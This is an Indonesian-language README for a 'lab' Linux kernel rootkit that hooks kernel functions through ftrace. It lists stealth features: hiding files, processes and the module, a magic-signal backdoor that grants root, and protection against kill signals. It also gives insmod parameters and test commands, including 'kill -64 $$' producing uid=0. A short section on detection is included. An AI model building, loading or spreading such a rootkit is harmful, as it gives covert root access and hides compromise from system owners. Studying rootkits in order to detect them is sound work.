# Lab: Kernel Rootkit (ftrace)

LKM rootkit modern untuk kernel 6.8 — tanpa patch `sys_call_table` / CR0.
Hook via **ftrace IPMODIFY**, resolusi simbol via `kprobe(kallsyms_lookup_name)`.

## Fitur (full stealth pack)

| Fitur | Mekanisme | Param |
|-------|-----------|-------|
| Hide file/dir | filter `getdents64` by substring | `hide_prefix="rk_"` |
| Hide proses | filter entry PID numerik di `/proc` bila comm mengandung prefix / PID match | `proc_prefix="rk_"`, `hide_pid=1234` |
| Hide module | `list_del` (lsmod) + filter nama-modul di `getdents64` (`/sys/module`); sysfs tidak dihapus agar `rmmod` tetap jalan | `hide_module=1` |
| Privesc | `kill(<pid>, SIG_MAGIC)` → `commit_creds(root)` | `sig_magic=64` |
| Anti-kill | `kill` ke PID proteksi (SIGKILL/SIGTERM/SIGSTOP) → `-EPERM` | `protect_pid`, `proc_prefix` |

## Build (DI VPS, bukan lokal)

```bash
# di VPS kernel 6.8 + headers (sudah ready):
cd ~/xcb-v2/labs/rootkit
make
sudo insmod rootkit.ko hide_prefix="rk_" proc_prefix="rk_" sig_magic=64 hide_module=1
dmesg | tail
sudo rmmod rootkit
```

## Uji cepat

```bash
touch /tmp/rk_rahasia.txt
ls /tmp | grep rk_          # kosong (terfilter)
ls /tmp | cat               # tetap kosong via pipe juga

# privesc:
kill -64 $$                 # magic signal, cek:
id                          # uid=0(root)

# anti-kill (di shell rk_ atau PID proteksi):
kill -9 <pid_protected>     # Operation not permitted

# modul hilang:
lsmod | grep rootkit        # kosong bila hide_module=1

# munculkan lagi WAJIB sebelum rmmod (modul yang ter-delist tidak bisa
# di-rmmod by name — kernel mencari via list):
kill -63 1                  # sinyal unhide (sig_unhide, default 63)
lsmod | grep rootkit        # terlihat lagi
sudo rmmod rootkit
```

## Catatan

- `hide_prefix=""` = matikan hide file. `proc_prefix=""` = matikan hide/proteksi proses.
- `unhide` on rmmod best-effort untuk sysfs; `rmmod` tetap jalan via `delete_module`.
- Deteksi: `kallsyms_lookup_name` via kprobe + ftrace filter IP terlihat di `/sys/kernel/tracing/enabled_functions` dan `dmesg`. Ini lab, bukan stealth APT.
- Beda dari `labs/syscall-hook/kmod`: yang lama menimpa tabel (kentara, rapuh di ≥5.3). Yang ini tidak menyentuh tabel sama sekali.
